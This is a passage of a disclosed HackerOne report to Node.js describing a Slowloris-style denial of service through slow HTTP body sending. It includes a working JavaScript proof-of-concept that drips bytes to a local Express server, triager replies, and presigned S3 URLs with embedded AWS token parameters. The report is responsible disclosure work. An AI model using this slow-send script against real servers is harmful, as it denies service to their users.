{"id":799072,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTkwNzI=","url":"https://hackerone.com/reports/799072","title":"Slowloris, body parsing","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-02-18T21:52:59.796Z","submitted_at":"2020-02-18T21:52:59.796Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"underflow0","url":"/underflow0","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-17T19:25:57.436Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-09-17T19:25:51.095Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** [add summary of the vulnerability]\nAttackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open by maintaining activity, and use resources over an extended period.\n\n**Description:** [add more details about this vulnerability]\nBody data is sent one byte at a time, slowly, in a HTTP request. The connection stays open, hogging resources. There is no builtin feature that can make this trigger a timeout, as long as the bytes are sent at an interval lower than the `server.timeout` value if it is set. May not technically be a Node.js bug since it doesn't handle parsing of the body, but the typically body parsing library (e.g. https://www.npmjs.com/package/body-parser) does not implement any feature to mitigate the vulnerability.\n\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Start a HTTP server and set the server timeout to 2 seconds.\n  2. Add a library that parses the request body.\n  2. Open a connection to the server.\n  3. Send a HTTP header.\n  4. Send the body, 1 byte per second.\n\n## Impact: [add why this issue matters]\nSee summary.\n\n## Supporting Material/References:\n\nCode to reproduce\n```\nconst bodyParser = require('body-parser');\nconst express = require('express');\nconst net = require('net');\nconst http = require('http');\n\nasync function run() {\n    const expressApp = express();\n\n    expressApp.use(bodyParser.json());\n\n    expressApp.use(async (req, res) =\u003e {\n        res.send({body: req.body});\n    });\n\n    const server = http.createServer(expressApp);\n\n    setInterval(() =\u003e {\n        console.log(server.connections);\n    },  1000);\n\n    server.keepAliveTimeout = 2000;\n    server.timeout = 2000;\n\n    await new Promise(resolve =\u003e {\n        server.listen(3000, '127.0.0.1', () =\u003e {\n            resolve();\n        });\n    });\n\n    const client = new net.Socket();\n\n    const length = 5000;\n\n    const msg = `GET / HTTP/1.1\nHost: localhost:3000\nAccept: */*\nContent-Type: application/json\nContent-Length: ${length}\n\n[\"`;\n\n    client.connect(3000, '127.0.0.1', async function () {\n        client.write(msg);\n\n        for (let i = 0; i \u003c length - 4; i++) {\n            await new Promise(resolve =\u003e {\n                setTimeout(resolve, 1000);\n            });\n\n            client.write('' + (i % 10));\n        }\n\n        client.write('\"]');\n    });\n}\n\nrun();\n```\n\n## Impact\n\nAttackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open and use resources over an extended period.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e [add summary of the vulnerability]\u003cbr\u003e\nAttackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open by maintaining activity, and use resources over an extended period.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e [add more details about this vulnerability]\u003cbr\u003e\nBody data is sent one byte at a time, slowly, in a HTTP request. The connection stays open, hogging resources. There is no builtin feature that can make this trigger a timeout, as long as the bytes are sent at an interval lower than the \u003ccode\u003eserver.timeout\u003c/code\u003e value if it is set. May not technically be a Node.js bug since it doesn\u0026#39;t handle parsing of the body, but the typically body parsing library (e.g. \u003ca title=\"https://www.npmjs.com/package/body-parser\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbody-parser\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/body-parser\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) does not implement any feature to mitigate the vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e(Add details for how we can reproduce the issue)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eStart a HTTP server and set the server timeout to 2 seconds.\u003c/li\u003e\n\u003cli\u003eAdd a library that parses the request body.\u003c/li\u003e\n\u003cli\u003eOpen a connection to the server.\u003c/li\u003e\n\u003cli\u003eSend a HTTP header.\u003c/li\u003e\n\u003cli\u003eSend the body, 1 byte per second.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact-add-why-this-issue-matters\"\u003eImpact: [add why this issue matters]\u003c/h2\u003e\n\n\u003cp\u003eSee summary.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eCode to reproduce\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight hack\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003ebodyParser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;body-parser\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003eexpress\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;express\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003enet\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;net\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003ehttp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;http\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003eexpressApp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eexpress\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eexpressApp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"k\"\u003euse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ebodyParser\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eexpressApp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"k\"\u003euse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003eserver\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ehttp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateServer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eexpressApp\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003esetInterval\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnections\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e  \u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ekeepAliveTimeout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etimeout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003ePromise\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elisten\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;127.0.0.1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003eclient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003enet\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e5000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"no\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`GET / HTTP/1.1\nHost: localhost:3000\nAccept: */*\nContent-Type: application/json\nContent-Length: ${length}\n\n[\u0026quot;`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;127.0.0.1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003ePromise\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n            \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n        \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026quot;]\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open and use resources over an extended period.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-10-17T19:25:51.202Z","allow_singular_disclosure_after":-6262151.428169878,"singular_disclosure_allowed":true,"vote_count":1,"voters":["muemmelmoehre"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7086907,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @underflow0,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@turtle_shell","markdown_message":"\u003cp\u003eHi \u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/turtle_shell\"\u003e@turtle_shell\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T07:34:13.141Z","updated_at":"2020-02-19T07:34:13.141Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7086935,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @underflow0 and thanks for your report,\n\nI am having difficulties understanding your PoC.\n\n{F721148}\n\nHow do you know that this is causing a DoS? Can you please elaborate a little bit more your PoC to makes us understand that it is actually affecting the security?\n\nBest regards,\n@turtle_shell","markdown_message":"\u003cp\u003eHello \u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e and thanks for your report,\u003c/p\u003e\n\n\u003cp\u003eI am having difficulties understanding your PoC.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2020-02-19_at_08.37.22.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gSDBhPjspDTi4NGNoR6cj6ei?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-19_at_08.37.22.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-19_at_08.37.22.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065502Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026amp;X-Amz-Signature=d64ec32827c8173bd233a96e2f10d9ec030be28e8f6851e0266242ee480901ca\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gSDBhPjspDTi4NGNoR6cj6ei?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-19_at_08.37.22.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-19_at_08.37.22.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065502Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026amp;X-Amz-Signature=d64ec32827c8173bd233a96e2f10d9ec030be28e8f6851e0266242ee480901ca\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHow do you know that this is causing a DoS? Can you please elaborate a little bit more your PoC to makes us understand that it is actually affecting the security?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\n\u003ca href=\"/turtle_shell\"\u003e@turtle_shell\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T07:39:07.485Z","updated_at":"2020-02-19T07:39:07.485Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"attachments":[{"id":721148,"filename":"Screenshot_2020-02-19_at_08.37.22.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gSDBhPjspDTi4NGNoR6cj6ei?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-19_at_08.37.22.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-19_at_08.37.22.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065502Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEA